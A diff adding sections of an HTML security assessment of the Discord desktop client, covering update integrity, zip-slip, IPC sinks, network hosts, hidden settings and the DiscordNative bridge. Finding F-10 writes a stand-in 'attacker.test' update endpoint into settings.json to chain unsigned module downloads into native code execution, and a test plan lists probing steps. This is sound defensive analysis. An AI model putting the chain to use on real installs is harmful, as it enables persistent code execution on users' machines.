+<h3>8.7 Secrets found in the archive</h3>
+<table class="t-sec">
+<thead><tr><th>Secret</th><th>Location</th><th>Assessment</th></tr></thead>
+<tbody>
+<tr><td>6 × Sentry DSN keys</td><td><code>common/crashReporterSetup.js:22-27</code></td><td><span class="pill p-conf">Mitigated</span> Sentry DSNs are write-only ingestion keys and are designed to be public. Worst case is report spam.</td></tr>
+<tr><td>Minidump Sentry key</td><td><code>renderer/endpoints.js:8</code></td><td><span class="pill p-conf">Mitigated</span> Same reasoning.</td></tr>
+<tr><td><code>STAFF_SENTRY_DSN_KEY</code></td><td><code>crashReporterSetup.js:24, 44-53</code></td><td><span class="pill p-tent">Tentative</span> Interesting rather than dangerous: crash reports tagged <code>isStaff === 'true'</code> are routed to a separate project. The tag is set by the <i>web app</i>, so it is attacker-settable — an outsider could pollute the internal crash stream. Low impact.</td></tr>
+<tr><td>CA bundle, 245 KB</td><td><code>app/data/cacert.pem</code></td><td><span class="pill p-tent">Tentative</span> Not a secret, but bundling your own trust store means it ages independently of the OS. A revoked CA stays trusted until Discord ships a new bundle.</td></tr>
+</tbody>
+</table>
+<p><b>No private keys, no API secrets, no credentials were found</b> in either archive.</p>
+
+<h3>8.8 Update integrity</h3>
+
+<div class="card warn">
+<h4>F-7 · The legacy module updater performs no cryptographic verification in JavaScript</h4>
+<p class="f"><b>Found</b> <span>A module is accepted on the basis of an HTTP 200 and nothing else — no signature, no hash, no manifest digest comparison anywhere in the JS path.</span></p>
+<p class="f"><b>Evidence</b> <span>Download: <code>common/moduleUpdater.js:572-605</code>. Accept test: <code>:605</code> — <code>response.statusCode === 200</code>. Extract: <code>:702-764</code>. A grep of the whole file for <code>checksum|sha|signature|verify</code> returns only <code>:385</code>, which is an unrelated macOS code-signing <i>error string</i>.</span></p>
+<p class="f"><b>Simple English</b> <span>The app asks Discord's server for a zip, and if the server says "200 OK" it unpacks the contents into your home folder and later loads them as native code. The only thing standing between that and arbitrary code execution is HTTPS.</span></p>
+<p class="f"><b>Why it matters</b> <span>TLS is a real control, and against a network attacker it is sufficient. It is <i>not</i> sufficient against a compromise of the distribution endpoint, a mis-issued certificate, or an operator with access to the CDN — and signing exists precisely to cover those. The modules in question are <code>.node</code> binaries loaded into a process running as you.</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-risk">Potential</span> for the legacy path · <span class="pill p-unk">Unknown</span> for the current one. <code>USE_NEW_UPDATER</code> defaults to <code>true</code> only on Windows (<code>app_bootstrap/Constants.js:30</code>), and <code>common/updater.js</code> is a thin JSON-RPC shim over compiled code — so on macOS the legacy path is the live one unless the setting is overridden, and the new path's verification cannot be assessed from JavaScript at all.</span></p>
+<p class="f"><b>Remediation</b> <span>Sign module archives and verify in-process before extraction; fail closed.</span></p>
+<p class="f"><b>Next step</b> <span>Decompile the native updater (Ghidra/Hopper) to determine whether it verifies signatures. Until then this is the largest single gap in the analysis.</span></p>
+</div>
+
+<div class="card ok">
+<h4>F-8 · Zip-slip is blocked — but by <code>yauzl</code>, not by Discord's code</h4>
+<p class="f"><b>Found</b> <span>The extractor joins archive-controlled entry names onto a destination directory with no sanitisation of its own: <code>path.join(extractRoot, entry.fileName)</code> at <code>moduleUpdater.js:728-729</code>. That is the textbook zip-slip pattern.</span></p>
+<p class="f"><b>Why it is nonetheless safe</b> <span>The bundled <code>yauzl</code> validates every entry name before emitting it:</span></p>
+<pre style="margin-left:118px">// app/node_modules/yauzl/index.js:608-619, called from :426
+function validateFileName(fileName) {
+  if (fileName.indexOf("\\") !== -1)                       return "invalid characters…";
+  if (/^[a-zA-Z]:/.test(fileName) || /^\//.test(fileName)) return "absolute path…";
+  if (fileName.split("/").indexOf("..") !== -1)            return "invalid relative path…";
+  return null;
+}</pre>
+<p class="f"><b>Simple English</b> <span>A malicious zip that tried to write to <code>../../../../etc/</code> would be rejected — by the unzip library, which refuses those names on principle. Discord's own code does not check.</span></p>
+<p class="f"><b>Why it matters</b> <span>The outcome is correct today and fragile tomorrow. Swap the zip library, upgrade past a behaviour change, or pass <code>strictFileNames</code> differently, and the protection evaporates silently with no change to Discord's code. This is the difference between being safe and being <i>defended</i>.</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-conf">Adequately mitigated</span> — reported here specifically to record that an automated scanner would flag it, and that the flag would be a false positive.</span></p>
+<p class="f"><b>Remediation</b> <span>Add an explicit containment assertion after <code>path.resolve</code>, so the guarantee lives in Discord's code.</span></p>
+</div>
+
+<h3>8.9 Untrusted input reaching OS APIs</h3>
+<table>
+<thead><tr><th>Entry</th><th>Reaches</th><th>Guard</th><th>Verdict</th></tr></thead>
+<tbody>
+<tr><td><code>NATIVE_MODULES_FINISH_UPDATER_BOOTSTRAP</code></td><td><code>childProcess.spawn(hostExePath)</code></td><td><code>typeof === 'number'</code> × 3 (<code>nativeModules.js:78-80</code>)</td><td><span class="pill p-conf">Mitigated</span> Numbers cannot introduce path separators, so the <code>app-{major}.{minor}.{revision}</code> template cannot be escaped. The developer's own error string is <code>'You tried.'</code> — this was a considered defence.</td></tr>
+<tr><td><code>FILE_MANAGER_SHOW_ITEM_IN_FOLDER</code></td><td><code>shell.showItemInFolder(path)</code></td><td>none (<code>fileManager.js:30-32</code>)</td><td><span class="pill p-tent">Tentative</span> Reveals a path in Finder; does not execute. Low impact.</td></tr>
+<tr><td><code>discord-clip://</code> protocol</td><td><code>createReadStream(pathname)</code></td><td>content validation, not path validation (<code>clips.js:52-84</code>)</td><td><span class="pill p-risk">Potential</span> See F-9 below.</td></tr>
+<tr><td><code>NATIVE_MODULES_INSTALL</code></td><td>updater → extract path</td><td>URL-encoded in the request; <b>not</b> encoded in <code>path.join(moduleInstallPath, name)</code></td><td><span class="pill p-risk">Potential</span> See §5.3.</td></tr>
+<tr><td><code>GPU_SETTINGS_SET_CHROMIUM_SWITCHES</code></td><td>Chromium command line</td><td>not inspected in this pass</td><td><span class="pill p-unk">Unknown</span> — flagged for follow-up; Chromium switches are a powerful sink.</td></tr>
+</tbody>
+</table>
+
+<div class="card warn">
+<h4>F-9 · <code>discord-clip://</code> gates on file <i>content</i>, not file <i>location</i></h4>
+<p class="f"><b>Evidence</b> <span><code>browser/clips.js:52-84</code>. The handler normalises the path, then calls <code>getClipMetadata(filename, dirname)</code>; if that throws it returns 404. The metadata check requires a Discord-specific <code>uuid</code> box inside the MP4 container (<code>isDiscordUUIDBox</code>, <code>:48-49</code>). There is no check that <code>pathname</code> lies inside the clips directory.</span></p>
+<p class="f"><b>Simple English</b> <span>You can ask for any file on disk through this URL scheme, and the app will serve it — provided the file parses as an MP4 containing Discord's marker. That marker is the only lock on the door; the door's location is unrestricted.</span></p>
+<p class="f"><b>Why it matters</b> <span>Confidentiality impact is bounded by the content check, so this is not a general arbitrary-file-read. But a directory restriction is the cheap, obvious control and it is absent, and the handler also supports <code>Range</code> requests (<code>:86+</code>), which makes partial-content extraction straightforward.</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-risk">Potential</span>, low-to-moderate, requires an attacker-influenced file containing the marker.</span></p>
+<p class="f"><b>Remediation</b> <span><code>path.resolve</code> the request and assert containment within the clips directory before any <code>stat</code> or read.</span></p>
+<p class="f"><b>Next step</b> <span>In an authorised environment, request a known marker-bearing clip via an absolute path outside the clips directory and confirm the 200.</span></p>
+</div>
+
+<h3>8.10 Content protection — screenshot blocking</h3>
+<p>Two handlers, <code>WINDOW_SET_CONTENT_PROTCTION</code> (the typo is Discord's, at
+<code>IPCEvents.js:143</code> and <code>browser/window.js:127</code>) and
+<code>WINDOW_SET_WINDOW_CONTENT_PROTECTION</code> (<code>:140</code>), call
+<code>window.setContentProtection()</code> — excluding the window from screen capture at OS level, with a
+per-window override set so a global setting cannot un-protect a window that asked for protection
+individually (<code>:131-137, 143-149</code>). <span class="pill p-conf">Design property</span>, carefully
+built. The typo is cosmetic but is now load-bearing: it must be preserved in both the enum and the
+remote bundle.</p>
+
+<h3>8.11 Client-mod detection</h3>
+<pre>// common/crashReporterSetup.js:70-71
+ignoreErrors: ['EADDRINUSE', 'ResizeObserver loop limit exceeded',
+  'ResizeObserver loop completed with undelivered notifications.',
+  'EACCES: permission denied', 'BetterDiscord', 'VencordPatcher',
+  'mwittrien.github.io', 'Error: getaddrinfo ENOTFOUND raw.githubusercontent.com'],
+denyUrls: [/betterdiscord:\/\//]</pre>
+<p><b>Simple English.</b> Discord filters crash reports that mention the two most popular client
+mods, a known mod-plugin host, and a DNS failure for <code>raw.githubusercontent.com</code> (where mods
+fetch plugins).</p>
+<p><b>Why it matters.</b> This is noise reduction, not enforcement — the filter is client-side and
+only affects what reaches Sentry. But it is direct evidence that modded installs are common enough
+to pollute Discord's error budget, which in turn corroborates §2.1: the real code lives in a
+user-writable directory and is routinely modified. Note also <code>sampleRate</code>: 1% on stable
+Windows, but <b>100% on macOS and Linux</b> (<code>:36-42, 132-136</code>).</p>
+<p class="f"><b>Confidence</b> <span class="pill p-conf">Confirmed</span></p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s9">9 · Network &amp; third-party inventory</h2>
+
+<p><b>Method and its limits.</b> This is a complete enumeration of hardcoded <code>http(s)</code> URLs
+in both archives, excluding <code>node_modules</code> (which contributed only two source-comment
+links). <b>No network traffic was captured.</b> Every row below is "this URL is present in the code
+and reachable by this path," never "this request was observed."</p>
+
+<table>
+<thead><tr><th>Host / URL</th><th>File : line</th><th>Purpose (evidence-backed)</th><th>Trigger</th><th>Observed?</th></tr></thead>
+<tbody>
+<tr><td><code>https://discord.com</code></td><td><code>app/mainScreen.js:72</code></td><td>The web app itself; <code>WEBAPP_ENDPOINT</code> for every origin check</td><td>Every launch</td><td>No</td></tr>
+<tr><td><code>https://discordapp.com</code></td><td><code>mainScreen.js:74</code></td><td>Pre-migration fallback — used when neither <code>userDataCache.json</code> nor <code>domainMigrated</code> exists</td><td>Legacy installs</td><td>No</td></tr>
+<tr><td><code>https://canary.discord.com</code><br/><code>https://{channel}.discord.com</code></td><td><code>mainScreen.js:77,79</code></td><td>Non-stable release channels</td><td>Channel ≠ stable</td><td>No</td></tr>
+<tr><td><code>https://discord.com/api</code></td><td><code>app_bootstrap/Constants.js:24</code></td><td><code>API_ENDPOINT</code>; also the default <code>UPDATE_ENDPOINT</code> (<code>:25</code>)</td><td>Startup</td><td>No</td></tr>
+<tr><td><code>…/api/modules/{channel}/versions.json</code></td><td><code>moduleUpdater.js:243,490</code></td><td>Module manifest. Query: <code>host_version</code>, <code>platform</code></td><td>Startup + periodic</td><td>No</td></tr>
+<tr><td><code>…/api/modules/{channel}/{name}/{ver}</code></td><td><code>moduleUpdater.js:572</code></td><td>Module zip download. Optional <code>Authorization</code> header (<code>:576</code>)</td><td>Stale module</td><td>No</td></tr>
+<tr><td><code>…/api/updates/{channel}?platform=osx&amp;version=</code></td><td><code>moduleUpdater.js:274</code></td><td>Squirrel.Mac host-update feed</td><td>Startup</td><td>No</td></tr>
+<tr><td><code>https://updates.discord.com/</code></td><td><code>app_bootstrap/Constants.js:26</code></td><td><code>NEW_UPDATE_ENDPOINT</code> — the Rust updater's endpoint</td><td>If <code>USE_NEW_UPDATER</code></td><td>No</td></tr>
+<tr><td><code>https://cdn.discordapp.com/assets/content</code></td><td><code>renderer/fileManager.js:272,338</code></td><td><b>Allow-list prefix</b>, not a request — asset downloads must start with it</td><td>Asset fetch</td><td>No</td></tr>
+<tr><td><code>https://ciscobinary.openh264.org/</code></td><td><code>renderer/fileManager.js:403</code></td><td>Cisco's OpenH264 codec — allow-list prefix. Target file <code>libopenh264-2.5.1-linux64.7.so</code> (<code>:650</code>) is Linux-only</td><td>Linux video</td><td>No</td></tr>
+<tr><td><code>https://o64374.ingest.sentry.io/api/4505053715759104/minidump/</code></td><td><code>renderer/endpoints.js:8</code></td><td>Native crash minidump upload, key in the query string</td><td>After a crash</td><td>No</td></tr>
+<tr><td><code>https://{dsn}@{host}.ingest.sentry.io/{id}</code> × 6</td><td><code>crashReporterSetup.js:22-33,128-141</code></td><td>Per-channel and per-OS Sentry projects, plus a staff-only project</td><td>On error</td><td>No</td></tr>
+<tr><td><code>https://accounts.google.com/</code></td><td><code>mainScreen.js:532</code></td><td>Not a request — the redirect target that trips <code>insideAuthFlow</code> (§8.6)</td><td>Google sign-in</td><td>No</td></tr>
+<tr><td><code>https://d3ogqhtsivkon3.cloudfront.net</code></td><td><code>app/Constants.js:37</code></td><td><code>AllowedMediaOrigins.K_ID</code> — permitted camera/mic origin</td><td>Age check</td><td>No</td></tr>
+<tr><td><code>https://family.k-id.com</code></td><td><code>app/Constants.js:38</code></td><td><code>K_ID_V2</code> — same</td><td>Age check</td><td>No</td></tr>
+<tr><td><code>https://age-verification-k-id.privately.swiss</code></td><td><code>app/Constants.js:39</code></td><td><code>K_ID_FACE_SCAN</code> — same</td><td>Age check</td><td>No</td></tr>
+<tr><td><code>https://127.0.0.1:2999/liveclientdata/</code></td><td><code>renderer/riotGames.js:8</code></td><td>Riot's Live Client Data API, on localhost, pinned to <code>riotgames.pem</code></td><td>Riot game running</td><td>No</td></tr>
+<tr><td><code>https://discord.com/acknowledgements</code></td><td><code>systemTray.js:133</code><br/><code>applicationMenu/darwin.js:30</code></td><td>Opens in the system browser via <code>saferShellOpenExternal</code></td><td>Menu click</td><td>No</td></tr>
+</tbody>
+</table>
+
+<h3>9.1 The age-verification entries — what the evidence does and does not support</h3>
+<p><b>What we found.</b> Three origins belonging to <b>k-id</b> and to a Swiss company,
+<b>privately.swiss</b>, in a constant named <code>AllowedMediaOrigins</code> — and they are the <i>only</i>
+origins granted the <code>media</code> (camera/microphone) permission in
+<code>setPermissionRequestHandler</code> (<code>mainScreen.js:407-409</code>).</p>
+<p><b>What that supports.</b> Discord has integrated a third-party age-verification vendor, and at
+least one of its flows is camera-based — the constant is literally named
+<code>K_ID_FACE_SCAN</code>. For that page to work inside the Discord window, the shell must grant it the
+camera, and it does, by name.</p>
+<p><b>What that does not support.</b> It does not establish that any user's face has been
+transmitted, that these endpoints are contacted in normal operation, or what either vendor retains.
+The code grants a permission; it does not demonstrate a request. A URL in a constant is not
+evidence of a data flow.</p>
+<p class="f"><b>Confidence</b> <span><span class="pill p-conf">Confirmed</span> that the permission grant exists and is exclusive · <span class="pill p-unk">Unknown</span> what data moves.</span></p>
+<p class="f"><b>Next step</b> <span>Capture TLS metadata during an age-verification flow in an authorised test account. Not performed.</span></p>
+
+<h3>9.2 Connectivity diagnostics</h3>
+<p><code>app_bootstrap/desktopConnectivityTests.js:26-29</code> installs <code>webRequest</code> filters
+scoped by this regex:</p>
+<pre>^https?:\/\/(?:(?:[^\/]*\.)?discord(?:app)?\.com|localhost(?::\d+)?)\/{pathPattern}(?:\?.*)?$</pre>
+<p>It <i>observes</i> whether Discord's own endpoints respond, to diagnose failed launches. It is a
+passive listener on Discord-owned hosts and localhost only — it originates no traffic of its own.
+<span class="pill p-conf">Confirmed</span></p>
+
+<h3>9.3 The HTTP stack</h3>
+<p><code>app_bootstrap/request.js</code> tries Electron's <code>net.request</code> first — using
+<code>session.defaultSession</code>, so it inherits Chromium's proxy and cert handling — and silently
+falls back to the <code>request</code> npm library on any failure (<code>:183-189</code>). The fallback uses
+the bundled <code>cacert.pem</code> rather than the system trust store
+(<code>app/rootCertificates.js:16</code>). Both paths set <code>followAllRedirects</code>/<code>redirect:'follow'</code>
+(<code>:114, :140</code>), and <code>electronRequest</code> auto-answers HTTP auth challenges with an empty
+callback (<code>:160</code>).</p>
+<p><b>Why it matters.</b> Two stacks with two trust stores and two redirect handlers, chosen by
+try/catch, is a recipe for divergent security behaviour. If the Electron path fails for a reason
+<i>related</i> to certificate validation, the fallback re-attempts with a different trust
+configuration. That is worth a closer look than this pass gave it.</p>
+<p class="f"><b>Classification</b> <span class="pill p-unk">Unknown</span> — flagged, not assessed.</p>
+
+<h3>9.4 Riot Games — correcting a tempting inference</h3>
+<p>A dedicated <code>riotGames</code> bridge member and a bundled <code>riotgames.pem</code> look like
+evidence of a partnership. They are not. <code>renderer/riotGames.js</code> performs a plain GET against
+<code>https://127.0.0.1:2999/liveclientdata/</code> — Riot's <b>publicly documented Live Client Data
+API</b>, served by the League of Legends client on the user's own machine with a self-signed
+certificate. The bundled PEM exists because that certificate is not in any public trust store, so it
+must be pinned explicitly (<code>:20-25</code>). This is how Rich Presence reads your current match. No
+business relationship is required, and none is evidenced.</p>
+<p class="f"><b>Confidence</b> <span class="pill p-conf">Confirmed</span> — the request is local-only; <code>ca: riotRootCA</code> is passed explicitly.</p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s10">10 · Runtime observations &amp; limitations</h2>
+
+<div class="card bad">
+<h4>No runtime analysis was performed</h4>
+<p>No dynamic instrumentation, no process tracing, no network capture, no debugger attachment, no
+modified build. Every finding in this report is derived from reading shipped files. Statements about
+behaviour are statements about what the code <i>will</i> do if reached, not observations that it was.</p>
+</div>
+
+<h3>10.1 What static analysis cannot settle here</h3>
+<table>
+<thead><tr><th>Question</th><th>Why static analysis is insufficient</th></tr></thead>
+<tbody>
+<tr><td>Which of the 136 handlers are actually invoked?</td><td>Callers live in the remote bundle at <code>discord.com</code>, which is not part of either archive.</td></tr>
+<tr><td>Does the native updater verify signatures?</td><td><code>common/updater.js</code> is a JSON-RPC shim; the logic is compiled Rust in <code>discord_dispatch</code>.</td></tr>
+<tr><td>Is <code>DiscordNative</code> mutated after exposure?</td><td><code>contextBridge</code> deep-copies at exposure time, but <code>mainScreenPreload.js:73-75</code> also assigns <code>global.DiscordNative</code> on <code>process.once('loaded')</code> — a second reference whose behaviour needs observation.</td></tr>
+<tr><td>How is voice audio captured?</td><td><code>discord_voice</code> is 81 MB of compiled code and the Chromium <code>media</code> permission is not granted to <code>discord.com</code> (F-3).</td></tr>
+<tr><td>Is the OAuth navigation window exploitable?</td><td>Requires attempting navigation while <code>insideAuthFlow</code> is set (F-6).</td></tr>
+<tr><td>What does the web app do with <code>WINDOW_DEVTOOLS_OPENED</code>?</td><td>Remote code.</td></tr>
+</tbody>
+</table>
+
+<h3>10.2 Test plan — safe, non-destructive, in priority order</h3>
+<ol>
+<li><b>Enumerate the live bridge.</b> Launch with
+<code>DANGEROUS_ENABLE_DEVTOOLS_ONLY_ENABLE_IF_YOU_KNOW_WHAT_YOURE_DOING: true</code> in
+<code>settings.json</code>, open the console, evaluate <code>Object.keys(DiscordNative)</code> and recurse
+one level. Settles §12 definitively. Read-only.</li>
+<li><b>Verify the allow-list.</b> In the same console,
+<code>DiscordNative.ipc.send('NOT_ON_THE_LIST')</code> should throw <code>'cannot send this event'</code>
+(<code>renderer/ipc.js:14</code>). Confirms the control empirically.</li>
+<li><b>Observe update traffic.</b> Point <code>API_ENDPOINT</code> at a local HTTPS server you control,
+launch, and record the exact request sequence. Confirms §9 rows 4-7 without touching Discord
+infrastructure.</li>
+<li><b>Test the OAuth window (F-6).</b> In a build you control, force <code>insideAuthFlow = true</code>
+and attempt an off-origin navigation; check whether the preload attaches and
+<code>window.DiscordNative</code> is populated. The single highest-value test.</li>
+<li><b>Test clip containment (F-9).</b> Request a marker-bearing MP4 by absolute path from outside
+the clips directory; expect 200 if unguarded.</li>
+<li><b>Decompile the native updater.</b> Ghidra or Hopper on <code>discord_dispatch</code>, looking for
+Ed25519/RSA verification before extraction. Closes the biggest gap (F-7).</li>
+</ol>
+<p class="small">All steps operate on a local installation, use test accounts, and send nothing to
+Discord's production infrastructure beyond ordinary client traffic. Step 6 requires a decompiler
+licence you are entitled to use.</p>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s11">11 · Configuration &amp; hidden switches</h2>
+
+<p><b>The mechanism.</b> <code>common/Settings.js</code> is a 57-line JSON file wrapper. Its
+<code>get(key, defaultValue = false)</code> returns the stored value if the key is present and the
+default otherwise. The file it reads is:</p>
+<pre>~/Library/Application Support/discord/settings.json
+   └─ path built at Settings.js:13 — path.join(root, 'settings.json')
+   └─ root from common/paths.js:44-46 — appData/discord{channel}</pre>
+<p>This file is <b>user-writable, unsigned, and read before the window exists</b>. Every switch below
+is set by editing it — no command line, no build flag.</p>
+
+<h3>11.1 Verified switches</h3>
+<table>
+<thead><tr><th>Key</th><th>Defined / read at</th><th>Default</th><th>Effect &amp; security implication</th></tr></thead>
+<tbody>
+<tr><td><code>WEBAPP_ENDPOINT</code><br/><span class="small">env: <code>DISCORD_WEBAPP_ENDPOINT</code></span></td><td><code>mainScreen.js:62-66</code></td><td><code>https://discord.com</code></td><td><b>The most powerful switch in the app.</b> Replaces the entire UI source, <i>and</i> becomes the value every origin check compares against (<code>:395, 420, 441, 527</code>). Set it and the fence moves with it. Env var takes priority over the setting and logs itself at <code>:63</code>.</td></tr>
+<tr><td><code>DANGEROUS_ENABLE_DEVTOOLS_ONLY_ENABLE_IF_YOU_KNOW_WHAT_YOURE_DOING</code></td><td><code>app/index.js:82-83</code></td><td><code>false</code> on stable; <code>true</code> elsewhere</td><td>Feeds <code>webPreferences.devTools</code> (<code>mainScreen.js:358</code>) and the application menu (<code>index.js:85</code>). The name is the documentation.</td></tr>
+<tr><td><code>API_ENDPOINT</code></td><td><code>app_bootstrap/Constants.js:24</code></td><td><code>https://discord.com/api</code></td><td>Also the default <code>UPDATE_ENDPOINT</code> — so overriding it redirects the <b>module download source</b>, which combined with F-7 (no signature check) is the full chain from "edit a JSON file" to "load arbitrary native code."</td></tr>
+<tr><td><code>UPDATE_ENDPOINT</code></td><td><code>app_bootstrap/Constants.js:25</code></td><td><code>API_ENDPOINT</code></td><td>Same, more directly.</td></tr>
+<tr><td><code>NEW_UPDATE_ENDPOINT</code></td><td><code>app_bootstrap/Constants.js:26</code></td><td><code>https://updates.discord.com/</code></td><td>Rust-updater endpoint.</td></tr>
+<tr><td><code>USE_NEW_UPDATER</code></td><td><code>app_bootstrap/Constants.js:30</code></td><td><code>false</code>, OR <code>true</code> on win32</td><td>Selects native updater over legacy. <b>On macOS the legacy path is the default</b> — which is the one with no signature check.</td></tr>
+<tr><td><code>USE_RUST_BSPATCH</code></td><td><code>app_bootstrap/Constants.js:29</code></td><td><code>false</code>, OR <code>true</code> on darwin</td><td>Rust binary-patch implementation. Enabled by default on macOS.</td></tr>
+<tr><td><code>enableConferenceMode</code></td><td><code>mainScreen.js:89-90</code></td><td><code>false</code></td><td>Loads <code>/conference-mode</code> instead of <code>/app</code> (<code>Constants.js:41-44</code>). A distinct product surface, reachable by a one-line edit.</td></tr>
+<tr><td><code>MIN_WIDTH</code> / <code>MIN_HEIGHT</code></td><td><code>mainScreen.js:110-111</code></td><td>940 / 500</td><td>Overrides the enforced minimum window size.</td></tr>
+<tr><td><code>IS_MAXIMIZED</code> / <code>IS_MINIMIZED</code> / <code>WINDOW_BOUNDS</code></td><td><code>mainScreen.js:430,433,216-219</code></td><td>—</td><td>Persisted window geometry.</td></tr>
+<tr><td><code>MINIMIZE_TO_TRAY</code> / <code>START_MINIMIZED</code></td><td><code>mainScreen.js:637</code>, <code>autoStart/win32.js:22</code></td><td>—</td><td>Tray and startup behaviour.</td></tr>
+<tr><td><code>ALLOW_OPTIONAL_UPDATES</code></td><td><code>app_bootstrap/Constants.js:27</code></td><td><code>true</code></td><td>Whether non-mandatory updates install.</td></tr>
+<tr><td><code>LOG_LEVEL</code></td><td><code>app_bootstrap/Constants.js:28</code></td><td><code>'info'</code></td><td>Verbosity.</td></tr>
+<tr><td><code>ALWAYS_BOOTSTRAP_MODULES</code></td><td><code>moduleUpdater.js:230</code></td><td>—</td><td>Forces a full module re-bootstrap on every launch.</td></tr>
+</tbody>
+</table>
+
+<h3>11.2 Environment variables</h3>
+<table>
+<thead><tr><th>Variable</th><th>Read at</th><th>Effect</th></tr></thead>
+<tbody>
+<tr><td><code>DISCORD_WEBAPP_ENDPOINT</code></td><td><code>mainScreen.js:50,62-64</code></td><td>Overrides the UI source; wins over the setting</td></tr>
+<tr><td><code>DISCORD_USER_DATA_DIR</code></td><td><code>common/paths.js:35</code>, <code>browser/fileManager.js:7-8</code></td><td>Relocates <b>all</b> app data, including <code>settings.json</code> itself</td></tr>
+<tr><td><code>DISCORD_DISABLE_RESTART</code></td><td><code>mainScreen.js:49,520</code></td><td>Quit instead of reload after a renderer crash</td></tr>
+<tr><td><code>DISCORD_NETWORK_DEBUG_LOG</code></td><td><code>mainScreen.js:52,116,486-491</code></td><td><code>'true'</code> enables <code>setupNetworkLogging</code> — writes a network log to disk</td></tr>
+<tr><td><code>ELECTRON_ENABLE_STACK_DUMPING</code></td><td><code>crashReporterSetup.js:80</code></td><td>Alters crash-reporter init</td></tr>
+<tr><td><code>XDG_SESSION_TYPE</code>, <code>WAYLAND_DISPLAY</code>, <code>FLATPAK_ID</code>, <code>SNAP</code>, <code>APPIMAGE</code>, <code>XDG_CURRENT_DESKTOP</code>, <code>GDMSESSION</code></td><td><code>powerMonitor.js:14</code>, <code>crashReporterSetup.js:93-107</code></td><td>Linux packaging and display-server detection, reported as crash metadata</td></tr>
+</tbody>
+</table>
+
+<h3>11.3 The leads from the initial analysis, verified</h3>
+<table>
+<thead><tr><th>Lead</th><th>Verdict</th><th>What it actually is</th></tr></thead>
+<tbody>
+<tr><td><code>DISCORD_WEBAPP_ENDPOINT</code></td><td><span class="pill p-conf">Confirmed</span></td><td>Env var at <code>mainScreen.js:50</code>. Correct, and more consequential than it first appears: it redefines <code>WEBAPP_ENDPOINT</code>, which is the reference value for every origin check in the app.</td></tr>
+<tr><td><code>domainMigrated</code></td><td><span class="pill p-conf">Confirmed, mechanism corrected</span></td><td>Not a toggle — a <b>marker file</b>. <code>browser/userDataCache.js:38-42</code> creates it when <code>deleteCachedUserData()</code> runs. <code>mainScreen.js:55-59, 68-75</code> then reads its presence (or that of <code>userDataCache.json</code>) to choose <code>discord.com</code> over <code>discordapp.com</code>. A one-way migration latch.</td></tr>
+<tr><td><code>enableConferenceMode</code></td><td><span class="pill p-conf">Confirmed</span></td><td>Setting at <code>mainScreen.js:89</code>; swaps the loaded path.</td></tr>
+<tr><td><code>DANGEROUS_ENABLE_DEVTOOLS…</code></td><td><span class="pill p-conf">Confirmed</span></td><td>Setting at <code>index.js:82</code>; also gates the menu.</td></tr>
+<tr><td><code>riotGames</code></td><td><span class="pill p-conf">Confirmed, inference corrected</span></td><td>A localhost API client, not a partnership. See §9.4.</td></tr>
+<tr><td>"~30 bridge entries"</td><td><span class="pill p-conf">Confirmed exactly 30</span></td><td>See §12.</td></tr>
+<tr><td>"49 message names / 85 operations / 33 handlers"</td><td><span class="pill p-tent">Superseded</span></td><td>Those were partial-tool counts. Verified: <b>144</b> canonical names, <b>136</b> concrete main-process registrations. See §12.3.</td></tr>
+</tbody>
+</table>
+
+<div class="card bad">
+<h4>F-10 · Security-critical configuration lives in an unsigned, user-writable JSON file</h4>
+<p class="f"><b>Chain</b> <span>Write <code>{"API_ENDPOINT":"https://attacker.test/api"}</code> to <code>settings.json</code> → <code>app_bootstrap/Constants.js:24-25</code> adopts it as <code>UPDATE_ENDPOINT</code> → <code>moduleUpdater.js:243</code> builds <code>remoteBaseURL</code> from it → <code>:572-605</code> downloads a zip and accepts it on HTTP 200 with <b>no signature check</b> (F-7) → <code>:702-764</code> extracts into <code>module_data/</code> → <code>renderer/nativeModules.js:44</code> <code>require()</code>s it as native code.</span></p>
+<p class="f"><b>Simple English</b> <span>Edit one line in a text file in your own home folder, and Discord will download its program from somewhere else and run it.</span></p>
+<p class="f"><b>Why it matters</b> <span>The honest framing: this is <b>not a privilege-escalation vulnerability</b>. An attacker who can write that file already runs as you, and could simply edit <code>core.asar</code> directly (§2.1). It is a <i>persistence and tamper</i> surface — it converts one quiet file write into durable control over the app's code source, surviving reinstalls of the <code>.app</code> bundle. It is also exactly the mechanism legitimate client mods use.</span></p>
+<p class="f"><b>Classification</b> <span><span class="pill p-conf">Design property</span> with real abuse potential. Not exploitable from the renderer — <code>SETTINGS_SET</code> (<code>browser/settings.js:28</code>) writes to a different store, the injected <code>appSettings</code>, and the keys above are read at launcher time before the renderer exists.</span></p>
+<p class="f"><b>Remediation</b> <span>Sign or HMAC the settings file; or hard-pin <code>UPDATE_ENDPOINT</code> at build time and ignore any override on stable channels. The second is cheap and closes the chain.</span></p>
+<p class="f"><b>Next step</b> <span>Confirm in an isolated VM that a modified <code>API_ENDPOINT</code> is honoured on a stable build. Not performed.</span></p>
+</div>
+
+<!-- ============================================================ -->
+<h2 class="nobrk" id="s12">12 · Dynamic-code investigation — enumerating <code>DiscordNative</code></h2>
+
+<p><b>The problem.</b> Automated analysis reported the bridge as
+<code>api_status: "dynamic"</code>, <code>members: []</code>, <code>unknown_members: 1</code> — it found the
+<code>contextBridge</code> call but could not enumerate what was behind it, because the object is built
+from <code>require()</code> expressions rather than written as literal properties.</p>
+
+<p><b>Resolution.</b> Extracted <code>app/mainScreenPreload.js</code> from the ASAR and read the object
+construction directly. The object is <i>statically</i> written; only its <i>values</i> are dynamic.
+Full enumeration follows, with each member's implementation file and verification basis.</p>
+
+<h3>12.1 The 30 members, verified by source inspection</h3>
+<pre>// app/mainScreenPreload.js:20-48  (verbatim, abridged to keys)
+const DiscordNative = {
+  isRenderer, setUncaughtExceptionHandler,
+  nativeModules, process, os, app, clipboard, ipc, gpuSettings, window,
+  powerMonitor, spellCheck, crashReporter, desktopCapture, fileManager, clips,
+  processUtils, powerSaveBlocker, http, accessibility, features, settings,
+  userDataCache, thumbar, safeStorage, hardware, riotGames,
+  remoteApp: app, remotePowerMonitor: powerMonitor, webAuthn
+};
+contextBridge.exposeInMainWorld('DiscordNative', DiscordNative);   // :68
+process.once('loaded', () =&gt; { global.DiscordNative = DiscordNative; });  // :69-71</pre>
+
+<table>
